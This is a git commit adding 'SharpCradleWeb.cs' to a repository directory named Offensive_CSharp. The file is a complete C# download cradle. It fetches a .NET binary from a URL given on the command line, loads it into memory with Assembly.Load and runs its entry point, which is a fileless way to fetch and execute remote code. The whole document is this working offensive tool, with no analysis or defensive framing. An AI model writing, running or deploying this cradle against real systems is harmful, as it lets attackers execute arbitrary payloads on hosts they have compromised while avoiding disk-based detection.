011b0ccfd50543338fab587b6f10dd7402cedd17
anthemtotheego <anthemtotheego@users.noreply.github.com>
2018-10-24 09:22:43 -0500

    Create SharpCradleWeb.cs

---
+++ Offensive_CSharp/SharpCradleWeb/SharpCradleWeb.cs
@@ -0,0 +1,46 @@
+using System;
+using System.IO;
+using System.Linq;
+using System.Net;
+using System.Reflection;
+
+namespace SharpCradleWeb
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {            
+                object[] cmd = args.ToArray();
+                MemoryStream ms = new MemoryStream();
+                using (WebClient client = new WebClient())
+                {
+                    //Access web and read the bytes from the binary file
+                    System.Net.ServicePointManager.SecurityProtocol = System.Net.SecurityProtocolType.Tls | System.Net.SecurityProtocolType.Tls11 | System.Net.SecurityProtocolType.Tls12;
+                    ms = new MemoryStream(client.DownloadData(args[1]));
+                    BinaryReader br = new BinaryReader(ms);
+                    byte[] bin = br.ReadBytes(Convert.ToInt32(ms.Length));
+                    ms.Close();
+                    br.Close();
+                    loadAssembly(bin, cmd);
+                }
+        }//End Main
+        //loadAssembly
+        public static void loadAssembly(byte[] bin, object[] commands)
+        {
+            Assembly a = Assembly.Load(bin);
+            try
+            {
+                a.EntryPoint.Invoke(null, new object[] { commands });
+            }
+            catch
+            {
+                MethodInfo method = a.EntryPoint;
+                if (method != null)
+                {
+                    object o = a.CreateInstance(method.Name);
+                    method.Invoke(o, null);
+                }
+            }//End try/catch            
+        }//End loadAssembly
+    }//End Program
+}//End Namespace
